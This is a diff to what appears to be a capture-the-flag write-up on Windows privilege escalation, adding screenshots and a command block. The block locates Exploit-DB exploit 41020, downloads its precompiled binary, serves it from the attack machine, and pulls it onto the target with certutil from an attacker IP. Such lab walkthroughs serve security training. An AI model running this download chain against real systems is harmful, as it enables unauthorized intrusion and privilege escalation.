@@ -73,9 +73,37 @@ python2 windows-exploit-suggester.py --database 2024-04-08-mssb.xls --systeminfo
 systeminfo
 ```
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/32eb7f0c-5bb7-41b6-8d33-dfb5f11445a1)
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a43d3006-c5f2-4141-9446-154e5c8169ea)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c48e9398-e5c2-4853-9bd8-1b9d0596b083)
+
+```
+# On the kali attack vm:
+searchsploit 41020
+
+searchsploit -m 41020
+
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+
+sudo python3 -m http.server
+
+# On the target machine:
+cd c:\Users\Public\Downloads
+
+certutil.exe -urlcache -split -f "http://10.10.14.24:8000/41020.exe" 41020.exe
+
+
+
+
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d51b7047-a7a0-4610-90a0-f28a43dbaa68)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e74bacef-2391-44c1-ad06-face08e28e93)
+
+
 
 
 
